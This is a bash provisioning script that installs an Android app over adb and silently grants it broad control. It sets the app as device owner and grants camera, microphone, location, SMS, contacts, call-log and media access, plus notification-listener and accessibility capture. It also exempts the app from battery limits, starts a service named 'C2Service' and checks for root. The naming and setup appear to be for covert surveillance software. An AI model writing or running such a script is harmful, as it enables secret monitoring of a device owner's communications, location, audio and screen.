#!/usr/bin/env bash
set -euo pipefail

PKG="ai.obsidian.agent"
ADB="${ADB:-adb}"

if [ $# -lt 1 ]; then
  echo "usage: $0 <apk> [serial]"
  exit 1
fi

APK="$1"
SERIAL="${2:-}"

if [ -n "$SERIAL" ]; then
  A() { "$ADB" -s "$SERIAL" "$@"; }
else
  A() { "$ADB" "$@"; }
fi

echo "[*] waiting for device"
A wait-for-device

echo "[*] installing"
A install -r -g -t "$APK"

echo "[*] rung 1: device owner"
A shell dpm set-device-owner "$PKG/.admin.AdminReceiver" \
  || echo "[!] device-owner failed (accounts present?) — continuing at rung 0/2"

echo "[*] runtime permissions"
for p in CAMERA RECORD_AUDIO ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION \
         ACCESS_BACKGROUND_LOCATION READ_SMS RECEIVE_SMS READ_CONTACTS \
         READ_CALL_LOG READ_CALENDAR READ_PHONE_STATE POST_NOTIFICATIONS \
         READ_MEDIA_IMAGES READ_MEDIA_VIDEO ACTIVITY_RECOGNITION; do
  A shell pm grant "$PKG" "android.permission.$p" 2>/dev/null || true
done

echo "[*] rung 2: appops"
for op in CAMERA RECORD_AUDIO FINE_LOCATION COARSE_LOCATION \
          GET_USAGE_STATS MANAGE_EXTERNAL_STORAGE SYSTEM_ALERT_WINDOW \
          PROJECT_MEDIA READ_EXTERNAL_STORAGE; do
  A shell appops set "$PKG" "$op" allow 2>/dev/null || true
done

echo "[*] battery and doze"
A shell dumpsys deviceidle whitelist +"$PKG" 2>/dev/null || true
A shell cmd deviceidle whitelist +"$PKG" 2>/dev/null || true
A shell settings put global hidden_api_policy 1

echo "[*] listeners"
A shell cmd notification allow_listener "$PKG/.collect.NotifListener" 2>/dev/null || true
A shell settings put secure enabled_accessibility_services "$PKG/.collect.A11yService"
A shell settings put secure accessibility_enabled 1

echo "[*] starting"
A shell am start-foreground-service -n "$PKG/.svc.C2Service" || true
A shell am start-foreground-service -n "$PKG/.svc.GuardService" || true

echo "[*] rung 3 check"
if A shell su -c id 2>/dev/null | grep -q "uid=0"; then
  echo "[+] root available — rung 3"
else
  echo "[-] no root — max rung 2"
fi

echo "[+] provisioning complete"
